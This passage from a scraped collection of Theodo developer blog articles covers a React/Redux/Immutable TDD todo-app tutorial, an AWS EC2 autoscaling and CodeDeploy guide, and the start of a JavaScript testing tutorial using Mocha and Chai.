mapStateToProps(state) {\r\n  return {\r\n    todos: state.get('todos'),\r\n    filter: state.get('filter')\r\n  };\r\n}\r\n\r\nexport const TodoAppContainer = connect(mapStateToProps)(TodoApp);\r\n\nIf you reload your app in the browser, you should see it initialized like before \u2013 except now it\u2019s using Redux tools.\nThe Redux dev tools\nNote: here is the relevant commit in the companion repository.\nNow that we have a Redux store and reducer set up, we can set up the Redux dev tools for a streamlined development experience.\nFirst, go and grab the Redux dev tools Chrome extension.\nThe dev tools are enabled at the time of the store creation, in index.jsx:\nsrc/index.jsx\n// ...\r\nimport {compose, createStore} from 'redux';\r\n\r\nconst createStoreDevTools = compose(\r\n  window.devToolsExtension ? window.devToolsExtension() : f => f\r\n)(createStore);\r\nconst store = createStoreDevTools(reducer);\r\n// ...\r\n\n\nReload the app in your browser and click on the Redux icon in the dev tools: here they are!\nThree different monitors are available out of the box: the Diff Monitor, the Log Monitor and the Slider Monitor (the one I talked about in part one). Feel free to play around with them \nSetting up our actions with Action Creators\nToggling the status of an item\nNote: here is the relevant commit in the companion repository.\nThe next step is to allow the user to toggle the status of todos, between active and completed.\nFirst, the reducer have to handle a new action, TOGGLE_COMPLETE, whose requirements will be to change the status between active and completed:\ntest/reducer_spec.js\nimport {List, Map, fromJS} from 'immutable';\r\nimport {expect} from 'chai';\r\n\r\nimport reducer from '../src/reducer';\r\n\r\ndescribe('reducer', () => {\r\n// ...\r\n  it('handles TOGGLE_COMPLETE by changing the status from active to completed', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'completed'}\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'TOGGLE_COMPLETE',\r\n      itemId: 1\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'completed'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'completed'}\r\n      ]\r\n    }));\r\n  });\r\n\r\n  it('handles TOGGLE_COMPLETE by changing the status from completed to active', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'completed'}\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'TOGGLE_COMPLETE',\r\n      itemId: 3\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'active'}\r\n      ]\r\n    }));\r\n  });\r\n});\r\n\nIn order to make the test pass, we can update the reducer:\nsrc/reducer.js\n// ...\r\nfunction toggleComplete(state, itemId) {\r\n  // We find the index associated with the itemId\r\n  const itemIndex = state.get('todos').findIndex(\r\n    (item) => item.get('id') === itemId\r\n  );\r\n  // We update the todo at this index\r\n  const updatedItem = state.get('todos')\r\n    .get(itemIndex)\r\n    .update('status', status => status === 'active' ? 'completed' : 'active');\r\n\r\n  // We update the state to account for the modified todo\r\n  return state.update('todos', todos => todos.set(itemIndex, updatedItem));\r\n}\r\n\r\nexport default function(state = Map(), action) {\r\n  switch (action.type) {\r\n    case 'SET_STATE':\r\n      return setState(state, action.state);\r\n    case 'TOGGLE_COMPLETE':\r\n      return toggleComplete(state, action.itemId);\r\n  }\r\n  return state;\r\n}\r\n\nIn the same vein as the SET_STATE action, we need to make the TodoAppContainer component aware of this action, so that the toggleComplete callback will be passed down to the TodoItem component (the one that actually makes the call).\nIn Redux, there is a standard way to do just that: Action Creators.\nAction creators are simply functions that return the properly formatted action \u2013 and these functions are the ones that are mapped to React props.\nLet\u2019s create our first action creator:\nsrc/action_creators.js\nexport function toggleComplete(itemId) {\r\n  return {\r\n    type: 'TOGGLE_COMPLETE',\r\n    itemId\r\n  }\r\n}\r\n\nNow, through a call to the connect function in the TodoAppContainer component that we already used for fetching the store, we are telling the component to map its props callbacks to the action creators of the same name:\nsrc/components/TodoApp.jsx\n// ...\r\nimport * as actionCreators from '../action_creators';\r\nexport class TodoApp extends React.Component {\r\n  // ...\r\n  render() {\r\n    return <div>\r\n      // ...\r\n        // We use the spread operator for better lisibility\r\n        <TodoList  {...this.props} />\r\n      // ...\r\n    </div>\r\n  }\r\n};\r\n\r\nexport const TodoAppContainer = connect(mapStateToProps, actionCreators)(TodoApp);\r\n\nRestart your web server and refresh your browser: tada! A click on an item now properly toggles its state. And if you look in the Redux dev tools, you can see the action being triggered and the subsequent state update.\nChanging the current filter\nNote: here is the relevant commit in the companion repository.\nNow that everything is set up, writing up our other actions will be a breeze. We will continue withe the CHANGE_FILTER action that will, you guessed it, change the current filter in the state and thus display only the filtered items.\nWe start by writing our action creator:\nsrc/action_creators.js\n// ...\r\nexport function changeFilter(filter) {\r\n  return {\r\n    type: 'CHANGE_FILTER',\r\n    filter\r\n  }\r\n}\r\n\nNow we write the unit tests for the reducer:\ntest/reducer_spec.js\n// ...\r\ndescribe('reducer', () => {\r\n  // ...\r\n  it('handles CHANGE_FILTER by changing the filter', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n      ],\r\n      filter: 'all'\r\n    });\r\n    const action = {\r\n      type: 'CHANGE_FILTER',\r\n      filter: 'active'\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n      ],\r\n      filter: 'active'\r\n    }));\r\n  });\r\n});\r\n\nAnd we write the associated reducer function:\nsrc/reducer.js\n// ...\r\nfunction changeFilter(state, filter) {\r\n  return state.set('filter', filter);\r\n}\r\n\r\nexport default function(state = Map(), action) {\r\n  switch (action.type) {\r\n    case 'SET_STATE':\r\n      return setState(state, action.state);\r\n    case 'TOGGLE_COMPLETE':\r\n      return toggleComplete(state, action.itemId);\r\n    case 'CHANGE_FILTER':\r\n      return changeFilter(state, action.filter);\r\n  }\r\n  return state;\r\n}\r\n\nLastly, we need to pass down the changeFilter callback to the TodoTools component:\nTodoApp.jsx\n// ...\r\nexport class TodoApp extends React.Component {\r\n  // ...\r\n  render() {\r\n    return <div>\r\n      <section className=\"todoapp\">\r\n        // ...\r\n        <TodoTools changeFilter={this.props.changeFilter}\r\n                   filter={this.props.filter}\r\n                   nbActiveItems={this.getNbActiveItems()} />\r\n      </section>\r\n      <Footer />\r\n    </div>\r\n  }\r\n};\r\n\nAnd that\u2019s it! The filter selector works perfectly \nItem editing\nNote: here is the relevant commit in the companion repository.\nWhen the user edits an item, there are actually two actions triggered out of three possible:\n\nThe user enters the editing mode: EDIT_ITEM;\nThe user cancels the editing mode (changes are not saved): CANCEL_EDITING;\nThe user validates her edition (changes are saved): DONE_EDITING\n\nWe can write the action creators for the three actions:\nsrc/action_creators.js\n// ...\r\nexport function editItem(itemId) {\r\n  return {\r\n    type: 'EDIT_ITEM',\r\n    itemId\r\n  }\r\n}\r\n\r\nexport function cancelEditing(itemId) {\r\n  return {\r\n    type: 'CANCEL_EDITING',\r\n    itemId\r\n  }\r\n}\r\n\r\nexport function doneEditing(itemId, newText) {\r\n  return {\r\n    type: 'DONE_EDITING',\r\n    itemId,\r\n    newText\r\n  }\r\n}\r\n\nNow we can write the unit tests for each of these actions:\ntest/reducer_spec.js\n// ...\r\ndescribe('reducer', () => {\r\n  // ...\r\n  it('handles EDIT_ITEM by setting editing to true', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active', editing: false},\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'EDIT_ITEM',\r\n      itemId: 1\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active', editing: true},\r\n      ]\r\n    }));\r\n  });\r\n\r\n  it('handles CANCEL_EDITING by setting editing to false', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active', editing: true},\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'CANCEL_EDITING',\r\n      itemId: 1\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active', editing: false},\r\n      ]\r\n    }));\r\n  });\r\n\r\n  it('handles DONE_EDITING by setting by updating the text', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active', editing: true},\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'DONE_EDITING',\r\n      itemId: 1,\r\n      newText: 'Redux',\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'Redux', status: 'active', editing: false},\r\n      ]\r\n    }));\r\n  });\r\n});\r\n\nAnd we can now develop the reducer functions that will actually handle the three actions:\nsrc/reducer.js\nfunction findItemIndex(state, itemId) {\r\n  return state.get('todos').findIndex(\r\n    (item) => item.get('id') === itemId\r\n  );\r\n}\r\n\r\n// We can refactor the toggleComplete function to use findItemIndex\r\nfunction toggleComplete(state, itemId) {\r\n  const itemIndex = findItemIndex(state, itemId);\r\n  const updatedItem = state.get('todos')\r\n    .get(itemIndex)\r\n    .update('status', status => status === 'active' ? 'completed' : 'active');\r\n\r\n  return state.update('todos', todos => todos.set(itemIndex, updatedItem));\r\n}\r\n\r\nfunction editItem(state, itemId) {\r\n  const itemIndex = findItemIndex(state, itemId);\r\n  const updatedItem = state.get('todos')\r\n    .get(itemIndex)\r\n    .set('editing', true);\r\n\r\n  return state.update('todos', todos => todos.set(itemIndex, updatedItem));\r\n}\r\n\r\nfunction cancelEditing(state, itemId) {\r\n  const itemIndex = findItemIndex(state, itemId);\r\n  const updatedItem = state.get('todos')\r\n    .get(itemIndex)\r\n    .set('editing', false);\r\n\r\n  return state.update('todos', todos => todos.set(itemIndex, updatedItem));\r\n}\r\n\r\nfunction doneEditing(state, itemId, newText) {\r\n  const itemIndex = findItemIndex(state, itemId);\r\n  const updatedItem = state.get('todos')\r\n    .get(itemIndex)\r\n    .set('editing', false)\r\n    .set('text', newText);\r\n\r\n  return state.update('todos', todos => todos.set(itemIndex, updatedItem));\r\n}\r\n\r\nexport default function(state = Map(), action) {\r\n  switch (action.type) {\r\n    // ...\r\n    case 'EDIT_ITEM':\r\n      return editItem(state, action.itemId);\r\n    case 'CANCEL_EDITING':\r\n      return cancelEditing(state, action.itemId);\r\n    case 'DONE_EDITING':\r\n      return doneEditing(state, action.itemId, action.newText);\r\n  }\r\n  return state;\r\n}\r\n\nAaaand it works like a charm in your browser \nClearing completed, adding and deleting items\nNote: here is the relevant commit in the companion repository.\nOur three remaining actions are the following:\n\nCLEAR_COMPLETED, that is triggered in the TodoTools component and clears completed items from the list;\nADD_ITEM, that is triggered in the TodoHeader component and add an item with the text entered by the user;\nDELETE_ITEM, that is called from TodoItem and deletes an item\n\nWe are now used to the workflow: add the action creators, unit test the reducer and code the logic, and eventually pass down the callback as props:\nsrc/action_creators.js\n// ...\r\nexport function clearCompleted() {\r\n  return {\r\n    type: 'CLEAR_COMPLETED'\r\n  }\r\n}\r\n\r\nexport function addItem(text) {\r\n  return {\r\n    type: 'ADD_ITEM',\r\n    text\r\n  }\r\n}\r\n\r\nexport function deleteItem(itemId) {\r\n  return {\r\n    type: 'DELETE_ITEM',\r\n    itemId\r\n  }\r\n}\r\n\ntest/reducer_spec.js\n// ...\r\ndescribe('reducer', () => {\r\n  // ...\r\n  it('handles CLEAR_COMPLETED by removing all the completed items', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'completed'},\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'CLEAR_COMPLETED'\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n      ]\r\n    }));\r\n  });\r\n\r\n  it('handles ADD_ITEM by adding the item', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'}\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'ADD_ITEM',\r\n      text: 'Redux'\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n      ]\r\n    }));\r\n  });\r\n\r\n  it('handles DELETE_ITEM by removing the item', () => {\r\n    const initialState = fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'completed'},\r\n      ]\r\n    });\r\n    const action = {\r\n      type: 'DELETE_ITEM',\r\n      itemId: 2\r\n    }\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n      ]\r\n    }));\r\n  });\r\n});\r\n\nsrc/reducer.js\nfunction clearCompleted(state) {\r\n  return state.update('todos',\r\n    (todos) => todos.filterNot(\r\n      (item) => item.get('status') === 'completed'\r\n    )\r\n  );\r\n}\r\n\r\nfunction addItem(state, text) {\r\n  const itemId = state.get('todos').reduce((maxId, item) => Math.max(maxId,item.get('id')), 0) + 1;\r\n  const newItem = Map({id: itemId, text: text, status: 'active'});\r\n  return state.update('todos', (todos) => todos.push(newItem));\r\n}\r\n\r\nfunction deleteItem(state, itemId) {\r\n  return state.update('todos',\r\n    (todos) => todos.filterNot(\r\n      (item) => item.get('id') === itemId\r\n    )\r\n  );\r\n}\r\n\r\nexport default function(state = Map(), action) {\r\n  switch (action.type) {\r\n    // ...\r\n    case 'CLEAR_COMPLETED':\r\n      return clearCompleted(state);\r\n    case 'ADD_ITEM':\r\n      return addItem(state, action.text);\r\n    case 'DELETE_ITEM':\r\n      return deleteItem(state, action.itemId);\r\n  }\r\n  return state;\r\n}\r\n\nsrc/components/TodoApp.jsx\n// ...\r\nexport class TodoApp extends React.Component {\r\n  // ...\r\n  render() {\r\n    return <div>\r\n      <section className=\"todoapp\">\r\n        // We pass down the addItem callback\r\n        <TodoHeader addItem={this.props.addItem}/>\r\n        <TodoList {...this.props} />\r\n        // We pass down the clearCompleted callback\r\n        <TodoTools changeFilter={this.props.changeFilter}\r\n                    filter={this.props.filter}\r\n                    nbActiveItems={this.getNbActiveItems()}\r\n                    clearCompleted={this.props.clearCompleted}/>\r\n      </section>\r\n      <Footer />\r\n    </div>\r\n  }\r\n};\r\n\nOur TodoMVC app is now complete!\nWrapping up\nThis concludes our TDD tutorial on the React, Redux & Immutable stack.\nThere are however plenty more things to dig if you want to go further, such as:\n\nReact Redux router to build complete Single Page Applications\nIsomorphic Redux for using Redux in the backend, which is extensively covered in these two tutorials\nGambit, a small wrapper around Redux to simplify the connections to APIs\nThis free series of videos by Dan Abramov (Redux\u2019s creator!) that cover a lot of Redux, in more depth than this article, with excellent pedagogy\nAnd much more available on the Redux website!\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Goutay\r\n  \t\t\t\r\n  \t\t\t\tWebdeveloper at Theodo. Webdesign & UX enthusiast.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is autoscaling? Do I need it?\nA good application should always be able to send responses to users\u2019 requests within reasonable delay. That\u2019s the whole point of application scaling.\nMost of the time the scaling process is predictable and happens over a long period of time (weeks, months or even years). In this kind of situation, those in charge of the infrastructure will have an idea of how many servers their app needs in advance. This gives them sufficient time to acquire, provision and deploy the extra instances ahead of time.\n\nHowever consider the following scenario: we\u2019re about to publish on our website a critical piece of news that\u2019s going to attract a lot of attention. We expect a huge peak of users over a relatively short period of time (a couple of days maybe) and then, in all likelihood, the metrics will slowly go back to their usual level over a longer period (days, weeks or maybe even months). We wouldn\u2019t want to #BreakTheInternet so we need to prepare.\nIn this scenario the scaling process is hectic and unpredictable. We obviously need more servers to handle the extra load, but how many exactly? Eyeballing the resources needed to handle the peak might be difficult, especially if it\u2019s the first time we\u2019re getting out of our load \u201ccomfort zone\u201d.\nEven then, assuming we decide to trust our totally-made-up-formula-which-is-definitely-not-just-a-cross-multiplication on the number of instances we\u2019ll need, should we provision and deploy them ourselves? If so, when is the right time to do so? Twenty-four hours in advance to give us time to test our new servers or 20 minutes before prime time to reduce the costs? The same kind of question applies for instances termination.\nAutoscaling is the solution to this problem. Quoting Wikipedia:\n\nAutoscaling [\u2026] is a method used in cloud computing, whereby the amount of computational resources in a server farm, typically measured in terms of the number of active servers, scales automatically based on the load on the farm.\n\nWith autoscaling, no need to try and compute the number of instances required, or devise a plan to be able to deploy new instances manually in case we reach maximum capacity. The autoscaling system automatically starts and stops instances depending on the load it\u2019s facing.\nIf you want your application to be able to handle a rapidly-changing load then you might want to look into autoscaling. It\u2019s also a good way to minimise your bills if you\u2019re already using a hosting provider that supports it (only using the resources you need and no more).\nAmazon Web Services (AWS) offers such an autoscaling system to be used with it\u2019s Elastic Compute Cloud (EC2) instances.\nWhat we need\nAn AWS account\nIf you already have an Amazon account you can just login to AWS, if not you can create an account from the same page.\nDuring your first login, AWS will ask for your credit card details, however you\u2019ll be eligible to AWS Free Tier which includes most of AWS services for free during one year (with limitations of course).\nRemember to activate Multi-Factor Authentication for more security.\nA certificate\nOnce your AWS account is created, go to Security Credentials > X.509 Certificates and click Create new certificate. This certificate will be used to log in to the instances.\nA stateless application\nWhether it\u2019s a website or the backend of some software, an application needs to be stateless in order to be able to increase the number of application servers effortlessly.\nSetting it up\nAmazon\u2019s implementation of autoscaling is based on their infamous EC2 instances. Auto scaling groups are collections of an indefinite number of such instances, but managed as one single entity.\nThe goal of this section is to create a simple auto scaling group (aka ASG in the rest of this article). To do so we will also need a template to create the instances from.\nIt all starts with one button: go to Services > EC2 then Autoscaling > Launch Configurations and \u2026\n\nIt will take us to the Launch Configuration creation page.\nLaunch configuration\nThe launch configuration (LC) is the template mentioned above. It creates the machines running in our auto scaling group. For example when our instances reach a predefined threshold AWS will spin up a new EC2 instance based on this launch configuration.\nCreating a launch configuration is exactly like configuring a new EC2 instance, except it won\u2019t actually launch any! We\u2019re asked to choose an AMI and an instance type (nano, micro, medium, etc) and optionally configure storage and security groups. If you already have some experience with EC2 you shouldn\u2019t have any trouble doing this.\nFinally after we\u2019ve picked a name for our launch configuration and reviewed it, it\u2019s time to save it.\nAuto scaling group\nNow that our launch configuration is ready we can move on to creating an auto scaling group.\nAn auto scaling group is a set of identical EC2 instances: they\u2019re all based on the same launch configuration so they have the same (virtual) hardware specs and the same provisioning. An ASG lives in a VPC (Virtual Private Cloud, a private network basically) and we can assign it several subnets. If you don\u2019t already have one, now is the time to create one for your ASG.\nWe can optionally create scaling policies to dictate how and when EC2 instances should be created or destroyed. One option is to \u201cKeep this group at its initial size\u201d and not configure any scaling policies. This is self explanatory: nothing will happen to our instances until we update the configuration.\nHowever it starts becoming interesting when we do configure scaling policies. After we\u2019ve chosen the default size of the ASG and reviewed its configuration, let\u2019s save it and create scaling policies!\nScaling policies\nScaling policies give fine control over when and how to create and destroy instances in an ASG.\nA policy is usually set off by an alarm (although it\u2019s not always necessary to configure one: we could also trigger policies manually) and takes an action. After its creation a new instance has a warm-up period during which it doesn\u2019t contribute to the ASG metrics.\nYou could imagine a scaling policy as a sentence:\n\nWhen the average CPU utilization is greater than 80%, then launch 2 more instances.\n\n\nThe \u201cwhen\u201d part of this sentence is the alarm ;\nthe \u201cthen\u201d part is the action.\n\nAlarms\nAlarm are triggered when certain instance metrics reach a predefined threshold. The figure below shows the metrics available to the alarm.\n\nActions\nThere are three types of action:\n\nadd instance(s)\nremove instance(s)\nset the number of instances\n\n\nApplication lifespan\nNow that our application has a variable number of instances to live on comes the time to deploy it. We\u2019ll discuss the two critical moments in an application lifespan: provisioning and deployment.\nProvisioning an ASG\nWe\u2019ve mentioned it quickly earlier but the crucial point here is that launch configurations are linked to an AMI (Amazon Machine Image). An AMI describes the filesystem content of a server and thus makes for a very good provisioning system.\nCreating a provisioning image\nWe\u2019ll want to create a provisioning AMI that contains our dependencies (eg. nginx, php, mysql, etc). We\u2019ll then use it with our launch configuration.\nLet\u2019s assume for now we have a provisioned instance we wish to use as our base for our future instances. We\u2019ll create a new AMI from this instance:\n\nWe\u2019ll be asked to name this image, I suggest using some sort of versioning scheme (eg. MyAwesomeBlog-v1) to avoid accidentally reprovisioning our fleet with the same AMI (or even worse: reprovisioning it with an older image)!\nThere are a couple of ways to provision an instance to build an AMI from. In both cases we\u2019ll need to create a new EC2 instance (one that\u2019s not part of the ASG) to build it from, using the AMI we want to use as a base (latest Ubuntu LTS for example). From there we could either configure the system and install dependencies manually or use a provisioning tool such as Ansible.\n(Re)provisioning\nOnce we have a new AMI we wish to deploy to our instances we\u2019ll need to tie it to a launch configuration.\nHowever, here comes the tricky part: AWS doesn\u2019t allow us to change the AMI of a launch configuration. The only option left is to copy our existing LC and use the new AMI with the copied LC.\n\nWhen creating the LC copy, remember to edit the AMI to use the new one!\nOnce that is done we can edit the ASG to use the new LC. From now on the newly launched instances will have the new provisioning.\nWhat\u2019s left for us to do is to progressively replace the old instances of our ASG with newer ones (based on the new AMI). To do that the easiest is to manually executes scaling policies. There are several strategies here: if there are n instances in the ASG we could either launch n new instances, wait for them to spin up (warm-up time) and then destroy all n old ones or create and delete instances one at a time (doing so n times). This depends mostly on how much time and budget we have (having more instances costs more, obviously).\nDeploying to an ASG\nHaving a variable-sized fleet of servers for our application gives rise to two problems:\n\nA new version of our app has been released, we want to deploy it. How do we know which (and how many) servers we should deploy it to?\nA scaling policy has been executed and a new instance has been launched inside our ASG. Should we deploy the app to this new instance ourselves?\n\nCodeDeploy config\nFortunately AWS provides an ASG-compatible deployment tool: CodeDeploy. It takes care of all deployment-related tasks and solves the two aforementioned problems.\nWhen creating an \u201cApplication\u201d within CodeDeploy, we\u2019ll need to enter a name for it and choose the ASG we\u2019re using.\nCodeDeploy implements different deployment configurations. Quoting AWS website:\n\nOneAtATime (most secure): deploys to one instance at a time. Succeeds if all instances succeed. Fails after the very first failure. Allows the deployment to succeed for some instances, even if the overall deployment fails.\nAllAtOnce (least secure): deploys to up to all instances at once. Succeeds if at least one instance succeeds. Fails after all instances fail.\nHalfAtATime: deploys to up to half of the instances at a time. Succeeds if at least half of the instances succeed; fails otherwise. Allows the deployment to succeed for some instances, even if the overall deployment fails.\n\nDepending on the expected resilience of our application we can opt for the quickest, least secure option (AllAtOnce) up to the most secure option (OneAtATime) which will probably take a while if we have a large amount of instances.\nThe final step is to configure a Service Role to grant access to the instances to CodeDeploy. Such a Role can be created in the IAM interface and should be attached to the policy \u201cAmazonEC2FullAccess\u201d.\nThe deployment configuration is specified by an appspec.yml file that should be placed in the root of our code directory.\nGitHub config\nIn order to deploy we now need to send our code/binaries to CodeDeploy. For this we have two options: upload them to S3 or use GitHub. For the purpose of this article we\u2019ll assume the code is hosted on GitHub (which is a much better option anyway).\nCreate a new deployment within CodeDeploy and choose \u201cMy application is stored in GitHub\u201d as a Revision Type. If that\u2019s not the case already you\u2019ll be asked to connect your GitHub account (oAuth) to AWS. From there we\u2019ll be able to choose which repository and which commit we want to deploy. Click \u201cdeploy now\u201d and that\u2019s it!\nThis is all very manual, so the next step is to have a nice auto-deploy feature. Wouldn\u2019t it be nice if our application was automatically deployed when a new commit on \u201cmaster\u201d has passed the CI tests? This great post from AWS blog explains it in detail.\nGoing further\nThere are a couple points we haven\u2019t mentioned yet:\n\nStep adjustments: scaling policies can either provide simple scaling (this is what we\u2019e been using until now) or step scaling. Step scaling enables us to change the magnitude of the action based on the size of the alarm threshold breach:\n\n  In this example we\u2019re creating a variable amount of new instances based on the CPU level (above the alarm level).\nScheduled actions: actions don\u2019t have to be triggered by an alarm (and thus be part of a scaling policy) to be executed, they can also be scheduled. That\u2019s very useful if we want to, say, lower our application resources every week-end.\nASGs also support spot instances (cheaper, otherwise unused EC2 instances, availability depends on your bid).\nOur application will need a load balancer to distribute requests. AWS\u2019s Elastic Load Balancers work out of the box with ASG.\n\nNow that our ASG is setup, everything should be running smoothly. The reliability of our application depends, of course, a lot on our scaling policies. Depending on the requirements we have to meet it might be more interesting to scale out quickly and then scale in slowly (\u00e0 la Netflix), or the other way round, or another entirely different strategy.\nHowever I cannot stress enough how important having the right scaling policies is. From Netflix\u2019s article:\n\nAuto scaling is a very powerful tool, but it can also be a double-edged sword. Without the proper configuration and testing it can do more harm than good. A number of edge cases may occur when attempting to optimize or make the configuration more complex.\n\nHappy scaling!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNathan Gaberel\r\n  \t\t\t\r\n  \t\t\t\tArchitect-developer at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA few months ago, we started a project with a Node.js backend. During this project we learned how to write clean and efficient tests, and we decided to write about it.\nIn this first part we will present the tools we used to test our application and why they are great. We will show you examples of Node.js tests, but the libraries can be used to test both your front and backend code. All the examples in this article can be found in this repository: https://github.com/tib-tib/demo-js-tests-part-1.\nPrerequisites\nYou must have Node.js and npm installed. To do so, you can follow the npm documentation.\nLet\u2019s write a JavaScript unit test\nWhat might a test look like when you don\u2019t use any framework or library? Let\u2019s take for example a function that computes the square of a given number:\nmodule.exports = {\r\n  square: function(a) {\r\n    return a*a;\r\n  }\r\n};\r\n\nWe assume that this function is in the file /workspace/math.js. You can write a test in the file /workspace/math.test.js. Since a test file is just a regular JavaScript file, you can name it as you wish though it is a good practice to use naming conventions. To check the behavior of the square function, we can use the different methods\u00a0provided in the assert module available in Node.js.\nvar assert = require('assert');\r\nvar math = require('./math');\r\n\r\nassert.equal(math.square(3), 9);\r\n\nTo launch the test, run: node /workspace/math.test.js. There is no output, that means the test succeeded because assert only provides information about the first failure. If you want a specific message you have to provide one in the argument list:\nvar assert = require('assert');\r\nvar math = require('./math');\r\n\r\nassert.equal(math.square(2), 4, 'square of 2 is 4');\r\nassert.equal(math.square(3), 9, 'square of 3 is 9');\r\n\nIf you make a mistake in your square function \u2013 for instance return a+a; instead of return a*a; \u2013 and launch the test, you will now see an error:\nassert.js:86\r\n  throw new assert.AssertionError({\r\n        ^\r\nAssertionError: square of 3 is 9\r\n    at Object.<anonymous> (/workspace/math.test.js:5:8)\r\n    at Module._compile (module.js:460:26)\r\n    at Object.Module._extensions..js (module.js:478:10)\r\n    at Module.load (module.js:355:32)\r\n    at Function.Module._load (module.js:310:12)\r\n    at Function.Module.runMain (module.js:501:10)\r\n    at startup (node.js:129:16)\r\n    at node.js:814:3\r\n\nWe can see that our test failed, but we don\u2019t have any information about why it did.\nHow to have clearer output and organized tests?\nLet\u2019s now try Mocha. Mocha is a framework to run tests serially in an asynchronous environment. In your workspace, install it with the following command:\nnpm install mocha\r\n\nThen, we have to change our test file a little bit to use Mocha\u2019s features. Let\u2019s create the file /workspace/test/math.js:\nvar assert = require('assert');\r\nvar math = require('../math');\r\n\r\ndescribe('square', function() {\r\n    it('should return the square of given numbers', function() {\r\n        assert.equal(math.square(2), 4);\r\n        assert.equal(math.square(3), 9);\r\n    });\r\n});\r\n\nBy default, Mocha will launch all JavaScript files located in a test directory in your workspace. This is great because we just have to run ./node_modules/.bin/mocha to handle several test files. Another benefit is that we have some output that describes our whole application:\n  square\r\n    \u2713 should return the square of given numbers\r\n\r\n  1 passing (8ms)\r\n\nIn case of failure we also have a much clearer output:\n  square\r\n    1) should return the square of given numbers\r\n\r\n\r\n  0 passing (18ms)\r\n  1 failing\r\n\r\n  1) square should return the square of given numbers:\r\n\r\n      AssertionError: 6 == 9\r\n      + expected - actual\r\n\r\n      -6\r\n      +9\r\n\r\n      at Context.<anonymous> (test/math.js:7:16)\r\n\nWe can see the tests that fail at a glance and then we have the detail of the failures. We notice that the expected and actual values are displayed, which is convenient to help us find our bug(s). Plus, we don\u2019t have the assertion stack trace anymore, as it does not provide useful information.\nMoreover, mocha allows us to have a clean and organized test structure. With describe you can literally describe what you are testing, and with the it function you can tell explicitly what behavior your function should have.\nNow that we have a proper test organization, we can focus on our assertions. Indeed, they lack readability.\nWrite assertions like you write sentences\nChai is an assertion library that helps improving the readability of your tests in two ways. First, you can use more semantic functions like lengthOf, below or within in your assertions. Second, it provides expect and should interfaces in order to have a more human friendly syntax in our assertions. For instance, thanks to Chai you can write the following assertions:\nmath.square(3).should.be.above(3);\r\nmath.square(3).should.be.within(6, 12);\r\nmath.square(3).should.be.below(10);\r\n\nLet\u2019s go back to our previous example. You can install chai with the following command:\nnpm install chai\nWith 